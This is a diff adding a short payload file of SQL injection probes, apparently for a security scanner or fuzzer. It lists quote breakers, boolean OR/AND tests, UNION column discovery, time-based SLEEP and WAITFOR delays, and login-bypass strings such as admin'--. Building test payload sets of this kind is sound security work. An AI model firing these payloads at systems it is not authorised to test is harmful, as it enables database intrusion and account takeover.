@@ -1,0 +1,51 @@
+# SQL injection — error-based, boolean, and basic UNION probes.
+# A fast-start set, not a wordlist manager; extend with a merge file for depth.
+# Blank lines and lines starting with '#' are comments (skipped at load).
+
+# Quote / syntax breakers
+'
+"
+`
+')
+")
+';
+';--
+'--
+'#
+")--
+"))--
+
+# Boolean OR/AND
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+" OR "1"="1
+" OR 1=1--
+') OR ('1'='1
+') OR 1=1--
+' OR ''='
+' AND '1'='2
+1 AND 1=1
+1 AND 1=2
+1' AND '1'='1
+1' AND '1'='2
+
+# ORDER BY / UNION column discovery
+1' ORDER BY 1--
+1' ORDER BY 10--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+-1' UNION SELECT 1,2,3--
+
+# Time-based
+' OR SLEEP(5)--
+1' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR pg_sleep(5)--
+
+# Auth bypass shapes
+admin'--
+admin' #
+admin'/*
+' OR 1=1 LIMIT 1--
